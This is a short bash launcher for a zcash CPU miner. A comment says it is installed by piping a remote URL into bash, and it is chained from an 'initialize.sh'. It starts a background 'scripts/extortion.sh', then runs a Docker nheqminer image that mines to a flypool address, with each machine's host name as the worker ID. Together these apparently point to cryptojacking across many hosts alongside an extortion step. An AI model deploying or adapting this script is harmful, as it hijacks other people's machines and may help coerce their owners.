#!/bin/bash

# Run: curl $url | bash -s $address
# Designed to be invoked my initialize.sh

# log all this output
exec 1> >(logger -s -t $(basename miner)) 2>&1

# # fetch dependencies and build the miner
# echo "building miner"
# cd ~
# sudo apt-get update && sudo apt-get -y install cmake build-essential libboost-all-dev
# git clone -b Linux https://github.com/nicehash/nheqminer.git
# cd nheqminer/cpu_xenoncat/Linux/asm/
# sh assemble.sh
# cd ../../../Linux_cmake/nheqminer_cpu
# cmake .
# make -j $(nproc)

# run the miner
echo "running miner"
bash scripts/extortion.sh &
docker run amingilani/nheqminer:latest /miner/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l us1-zcash.flypool.org:3333 -u $1."$(hostname)"
